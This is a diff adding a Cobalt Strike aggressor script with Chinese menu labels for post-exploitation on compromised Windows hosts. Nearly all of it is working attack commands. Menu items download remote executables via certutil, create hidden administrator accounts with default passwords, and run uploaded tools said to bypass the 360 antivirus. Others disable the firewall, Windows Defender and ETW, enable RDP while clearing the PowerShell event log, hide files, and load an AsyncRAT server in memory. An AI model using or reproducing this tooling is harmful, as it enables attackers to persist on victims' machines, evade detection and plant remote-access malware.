@@ -1,0 +1,248 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       Xway.cn@panda        #
+#                            #
+#                            #
+#                            #
+##############################
+menu "系统操作" {
+
+			    item "远程下载exe" {
+             prompt_text("远程文件地址?默认下载到c:\\windows\\helper.exe", "", lambda({
+            bshell(@ids, "Certutil.exe -urlcache -split -f $1 C:\\windows\\helper.exe");
+        }, @ids => $1));
+    }	
+
+menu "用户操作" {
+				item "激活guest用户" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net user guest /active:yes");
+			}
+		}
+
+
+				item "建立用户并加入管理员组" {
+                    $bid = $1['@'];
+                    $Dialog = dialog("添加本地管理员用户",%(user => "admin$", pass => "admin@123.", "groups" => "administrators", bid => $bid),&add_localuser);
+                    dialog_description($Dialog, "添加本地管理员用户"); 
+                    drow_text($Dialog, "user", "user: ");
+                    drow_text($Dialog, "pass", "pass: ");
+                    drow_text($Dialog, "groups", "groups: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+		}
+                sub add_localuser{
+    				local('$Name');
+    				$Name = $3['user'];
+    				$Pwd = $3['pass'];
+    				$groups = $3['groups'];
+    				bshell($bid, "net user $Name $Pwd /add  && net localgroup $groups $Name /add");
+				}
+
+
+    	menu "添加管理员用户$-bypass"{
+    		item "上传add-user"{
+        	local('$bid');
+        	foreach $bid ($1){
+            bupload($1, script_resource("/script/user.exe"));
+        		}
+        	}
+        	item "运行add-user" {
+			$bid = $1['@'];
+			$dialog = dialog("user:\$\pass:admin@123.", %(bid => $bid), &add_user);
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        	}
+        	item "删除add-user"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q user.exe");
+        	}
+		}
+
+    	}
+
+sub add_user{
+	bshell($bid, "user.exe");
+}
+
+menu "添加管理员用户-bypass"{
+
+			item "上传" {
+				$bid = $1;
+				$dialog = dialog("上传crack", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &upload_user);
+				drow_text($dialog, "UploadPath",  "上传路径: "); 	
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+        }
+sub upload_user {
+
+    bcd($bid, $3['UploadPath']);
+
+        bupload($bid, script_resource("/script/temp.exe"));
+    }
+            item "运行"{
+                $bid = $1['@'];
+                $Dialog = dialog("运行crack",%(username => "admin", password => "admin@123", bid => $bid),&temp_run);
+                dialog_description($Dialog, "bypass360创建管理员用户");
+				drow_text($Dialog, "username", "username: ");
+				drow_text($Dialog, "password", "password: ");
+                dbutton_action($Dialog, "运行");
+                dialog_show($Dialog);
+                }
+
+sub temp_run{
+    local('$username $password');
+	$username = $3['username'];
+	$password = $3['password'];
+	bshell($bid, "temp.exe  $+ $username  $+ $password");
+}  
+        	item "删除"{
+        	local('$bid');
+        	foreach $bid ($1){
+            	bshell($1, "del /f /s /q temp.exe");
+        	}
+		}  
+
+}
+		}
+		
+		
+		menu "关闭防火墙" {
+				item "win2003之前" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "netsh firewall set opmode disable");
+			}
+		}
+				item "win2003之后" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "netsh advfirewall set allprofiles state off");
+			}
+		}
+		}
+     menu "RDP相关" {
+
+				item "获取RDP端口" {
+            local('$bid');
+            foreach $bid ($1){
+                blog($1, "Check Rdp Open Port");
+                bpowershell_import($bid, script_resource("/script/RegRdpPort.ps1"));
+                bpowerpick($bid,"RegRdpPort");
+                bshell($bid,"wevtutil cl \"Windows PowerShell\"");
+                }
+            }
+				item "注册表开启RDP"{
+            local('$bid');
+                $bid = $1;
+                if (!-isadmin $bid['@']){
+                    show_error("Permission Denied!");
+                }
+                else{
+                    bshell($bid,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+                }
+            }
+
+			
+	item "开启RDP-win08/12" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != \"\") call setallowtsconnections 1");
+	    bshell($1, "wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1");
+	    bshell($1, "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f");
+        }
+	}
+	item "开启RDP-win7" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "wmic /namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != \"\") call setallowtsconnections 1");
+	    bshell($1, "wmic /namespace:\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1");
+        }
+	}
+	item "开启RDP-win03/xp" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "wmic path win32_terminalservicesetting where (__CLASS != \"\") call setallowtsconnections 1");
+        }
+	}
+	item "防火墙放行RDP规则" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow");
+        }
+	}
+        }
+
+			    menu "隐藏文件" {
+			    item "隐藏" {
+             prompt_text("文件路径", "", lambda({
+            bshell(@ids, "attrib +h +s $1");
+        }, @ids => $1));
+    }	
+			    item "显示" {
+             prompt_text("文件路径", "", lambda({
+            bshell(@ids, "attrib -h -s $1");
+        }, @ids => $1));
+    }
+	}
+
+				menu "关闭defender" {
+				item "组策略关闭defender" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD");
+			}
+		}
+
+				item "关闭defender" {
+					bexecute_assembly($1, script_resource("/script/dis_defender.exe"), "");
+		}
+		}
+
+menu "隐藏.net行为" {
+				item "cmd命令" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "set COMPlus_ETWEnabled=0");
+			}
+		}
+				item "blocketw" {
+					bexecute_assembly($1, script_resource("/script/blocketw.exe"), "");
+		}
+		}
+
+
+
+			item "设置beacon当前路径" {
+				$bid = $1;
+				$dialog = dialog("设置beacon当前路径", %(Path => "C:\\Windows\\Temp\\", bid => $bid), &beacon_path);
+				drow_text($dialog, "Path",  "设置路径: "); 	
+				dbutton_action($dialog, "设置");
+				dialog_show($dialog);
+        }
+sub beacon_path {
+
+    bcd($bid, $3['Path']);
+    }
+	
+			item "AsyncRAT上线" {
+				$bid = $1;
+				$dialog = dialog("内存加载AsyncRAT服务端上线", %(bid => $bid), &asyncrat);
+				drow_file($dialog, "server", "server: ");			
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }	
+sub asyncrat {
+        bexecute_assembly($bid, $3['server']);
+    }
+
+
+
+			
+
+
+}
